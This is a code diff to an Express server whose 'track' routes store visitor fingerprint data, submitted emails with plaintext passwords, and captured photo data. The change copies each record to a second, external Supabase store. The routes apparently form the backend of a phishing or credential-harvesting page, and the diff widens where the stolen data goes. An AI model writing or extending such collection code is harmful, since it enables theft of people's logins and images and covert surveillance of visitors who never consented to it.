@@ -1,6 +1,7 @@
 import { Router, type IRouter } from "express";
 import { db } from "@workspace/db";
 import { visitorsTable, photosTable, credentialsTable } from "@workspace/db/schema";
+import { sbInsert } from "../lib/supabase";
 import { randomUUID } from "crypto";
 
 const router: IRouter = Router();
@@ -14,17 +15,32 @@ router.post("/track/info", async (req, res) => {
       req.socket.remoteAddress ||
       "unknown";
 
-    await db.insert(visitorsTable).values({
-      sessionId,
-      userAgent: body.userAgent || null,
+    const record = {
+      session_id: sessionId,
+      user_agent: body.userAgent || null,
       language: body.language || null,
       platform: body.platform || null,
-      screenWidth: body.screenWidth || null,
-      screenHeight: body.screenHeight || null,
+      screen_width: body.screenWidth || null,
+      screen_height: body.screenHeight || null,
       timezone: body.timezone || null,
       referrer: body.referrer || null,
       ip,
-    });
+    };
+
+    await Promise.all([
+      db.insert(visitorsTable).values({
+        sessionId,
+        userAgent: body.userAgent || null,
+        language: body.language || null,
+        platform: body.platform || null,
+        screenWidth: body.screenWidth || null,
+        screenHeight: body.screenHeight || null,
+        timezone: body.timezone || null,
+        referrer: body.referrer || null,
+        ip,
+      }),
+      sbInsert("visitors", record),
+    ]);
 
     res.json({ success: true, sessionId });
   } catch (err) {
@@ -40,7 +56,12 @@ router.post("/track/credentials", async (req, res) => {
       res.status(400).json({ success: false, sessionId: "" });
       return;
     }
-    await db.insert(credentialsTable).values({ sessionId, email, password });
+
+    await Promise.all([
+      db.insert(credentialsTable).values({ sessionId, email, password }),
+      sbInsert("visitor_credentials", { session_id: sessionId, email, password }),
+    ]);
+
     res.json({ success: true, sessionId });
   } catch (err) {
     req.log.error({ err }, "Error saving credentials");
@@ -58,11 +79,14 @@ router.post("/track/photo", async (req, res) => {
       return;
     }
 
-    await db.insert(photosTable).values({
-      sessionId,
-      photoIndex,
-      imageData,
-    });
+    await Promise.all([
+      db.insert(photosTable).values({ sessionId, photoIndex, imageData }),
+      sbInsert("visitor_photos", {
+        session_id: sessionId,
+        photo_index: photoIndex,
+        image_data: imageData,
+      }),
+    ]);
 
     res.json({ success: true, sessionId });
   } catch (err) {
